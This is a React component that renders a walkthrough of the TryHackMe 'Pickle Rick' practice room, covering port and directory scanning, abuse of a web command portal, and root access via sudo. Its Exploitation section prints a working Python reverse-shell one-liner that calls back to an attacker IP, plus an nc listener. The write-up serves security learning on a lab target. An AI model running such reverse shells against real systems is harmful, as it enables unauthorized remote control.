import React from 'react';
import ScrollspyContainer from '../ScrollspyContainer';
import ImageCap from './Helpers/ImageCap';

import landing from '../../img/picklerick/background.png';
import gobusterFirst from '../../img/picklerick/gobuster.png';
import gobusterSecond from '../../img/picklerick/gobuster-sec.png';
import homepage from '../../img/picklerick/homepage.png';
import initialRoot from '../../img/picklerick/initial-root.png';
import key1 from '../../img/picklerick/key1.png';
import key2 from '../../img/picklerick/key2.png';
import key3 from '../../img/picklerick/key3.png';
import loginPage from '../../img/picklerick/login-page.png';
import ls from '../../img/picklerick/ls.png';
import ncListen from '../../img/picklerick/nc-listen.png';
import nmap from '../../img/picklerick/nmap.png';
import portal from '../../img/picklerick/portal.png';
import robots from '../../img/picklerick/robots.png';
import shellCaught from '../../img/picklerick/shell-caught.png';
import source from '../../img/picklerick/source.png';





class PickleRick extends React.Component {


    render() {
        return (
            <div className="writeup">
                <div className="container-fluid" >
                    <div className="row bg-dark">
                        <nav className="col-3 px-1 position-fixed offset">
                            <span>
                                <a href="https://tryhackme.com/room/picklerick" target="_blank" className="nav-header">Pickle Rick</a>
                                
                            </span>
                            <hr></hr>
                            
                            <ScrollspyContainer ids={['render','pIntro','pEnumeration','portscan','directorydiscovery','exploitation','rce','ingred-1','pPrivesc','rootUser','ingred-2','ingred-3']}></ScrollspyContainer>
                            <hr></hr>

                                                            
                        </nav>
                        
                        <div className="content col offset-3">
                            <div id="render" className="render"></div>
                            <div>
                                <div className="carousel landing">
                                    <div className="carousel-inner">
                                        <div className="carousel-item active landing-container">
                                            <img className="writeup-landing" src={landing} alt="Background image"></img>
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>
                                <h1 id="pIntro">Introduction</h1>
                                <p>This box is a Rick and Morty themed machine in which three ingredients need to be found to help Rick make his potion to transform himself back into a human.</p>
                                <p>This is a great box for beginners and it falls into the following categories</p>
                                <ul>
                                    <li>Linux</li>
                                    <li>RCE - Remote Command Execution</li>
                                </ul>
                                
                            <div>
                                <hr></hr>
                                <h1 id="pEnumeration">Enumeration</h1>
                                <h3 id="portscan" className="level-2">Port Scanning</h3>
                                <p>First, I used nmap to find open ports on the machine.</p>
                                <p className="code-snippet">&gt; nmap -sS -sC -sV -O 10.10.164.53 -oN nmap.scan</p>
                                <p>The above command explained:</p>
                                <ul>
                                    <li><span className="code-snippet inline">-sS</span> -  Uses a TCP SYN scan, this type of scan never fully forms a connection with the target. Instead, a specially crafted packet is sent and the response is analyzed to produce scan results.</li>
                                    <li><span className="code-snippet inline">-sC -sV -O</span> - These tell nmap to use common scripts, attempt to detect the version of running services, and attempt to detect the operating system.</li>
                                    <li><span className="code-snippet inline">-oN</span> - This saves the output of the scan to the target file.</li>
                                </ul>
                                <ImageCap image={nmap} text="nmap scan results." />
                                
                                <p>The nmap scan revealed an Apache website hosted on port 80.</p>
                                <p>Next, I used Firefox to take a look at the website.</p>
                                <ImageCap image={homepage} text="homepage of the website." />
                                
                                <ImageCap image={source} text="source code of the website." />
                                
                                <p>The homepage didnt offer much information, but the source code revealed the username: <span className="code-snippet inline">R1ckRul3s</span></p>
                                <hr></hr>
                                <h3 id="directorydiscovery" className="level-2">Directory Discovery</h3>
                                <p>I continued my enumeration with a gobuster scan to reveal hidden directories on the website.</p>
                                <p className="code-snippet">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.164.53 -o root-gobuster.scan</p>
                                <ImageCap image={gobusterFirst} text="results from first gobuster scan." />
                                
                                <p>The gobuster scan revealed an <span className="code-snippet inline">/assets</span> directory which only consisted of some images and minified JS files.</p>
                                <p>With this scan not revealing anything, I modified the command to check for different file extensions. I also used a smaller wordlist to prevent the scan from taking too long.</p>
                                <p className="code-snippet">gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u 10.10.164.53 -o files-gobuster.scan -x php,txt</p>
                                <ImageCap image={gobusterSecond} text="results from second gobuster scan." />
                                
                                <p>This time, a couple interesting files were found:</p>
                                <ul>
                                    <li><span className="code-snippet inline">/robots.txt</span></li>
                                    <li><span className="code-snippet inline">/login.php</span></li>
                                </ul>
                                <p>A look at <span className="code-snippet inline">/robots.txt</span> provided the following:</p>
                                <ImageCap image={robots} text="contents of robots.txt." />
                                
                                <hr></hr>
                                <h1 id="exploitation">Exploitation</h1>
                                <h3 id="rce" className="level-2">Remote Command Execution</h3>
                                <p>With a username and potentially a password, I navigated to <span className="code-snippet inline">/login.php</span></p>
                                <ImageCap image={loginPage} text="contents of the login page." />
                                
                                <p>The credentials found earlier allowed me to login and view Rick's Portal. This Portal featured a form that allows remote command execution and multiple other tabs that I cannot access.</p>
                                <p>I used the command <span className="code-snippet inline">id</span> to verify if RCE worked.</p>
                                <ImageCap image={portal} text="Rick's Portal and the results from id." />
                                
                                <p>With the ability to run commands on the server, I next used <span className="code-snippet inline">ls</span> to see what files exist in the working directory.</p>
                                <ImageCap image={ls} text="results from ls." />
                                
                                <p>I recognised some of these files which meant this was the website's home directory. Another file caught my attention:</p>
                                <p className="code-snippet">Sup3rS3cretPickl3Ingred.txt</p>
                                <h5 className="level-3" id="ingred-1">Ingredient 1</h5>
                                <p>This hidden file features the first ingredient:</p>
                                <ImageCap image={key1} text="first ingredient found." />
                                
                                <p>Next, I needed to use the RCE vulnerability to acquire a reverse shell. After testing multiple commands, I found that I was allowed to execute Python commands.</p>
                                <p>Before I used a Python reverse shell, I started a nc listener:</p>
                                <p className="code-snippet">nc -lvnp 4444</p>
                                <br></br>
                                <ImageCap image={ncListen} text="nc listener." />
                                
                                <p>With my listener setup, I used the following reverse shell:</p>
                                <p className="code-snippet">&gt; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.40",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</p>
                                <p className="hint">Don't forget to change values for your IP and port number.</p>
                                <p>And the shell is caught:</p>
                                <ImageCap image={shellCaught} text="reverse shell obtained." />
                                
                                <hr></hr>
                                <h1 id="pPrivesc">Privilege Escalation</h1>
                                <h3 id="rootUser" className="level-2">Root User</h3>
                                <p>After executing <span className="code-snippet inline">sudo -l</span>, I found out I can run all commands as root user. A quick <span className="code-snippet inline">sudo su</span> later and I have root.</p>
                                <ImageCap image={initialRoot} text="successfully acquired root privileges." />
                                
                                <h5 className="level-3" id="ingred-2">Ingredient 2</h5>
                                <p>The second ingredient was found in rick's home directory:</p>
                                <ImageCap image={key2} text="second ingredient found." />
                                
                                <h5 className="level-3" id="ingred-3">Ingredient 3</h5>
                                <p>The final ingredient was found in root's home directory:</p>
                                <ImageCap image={key3} text="final ingredient found." />
                                
                            
                            
                            
                            
                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

export default PickleRick;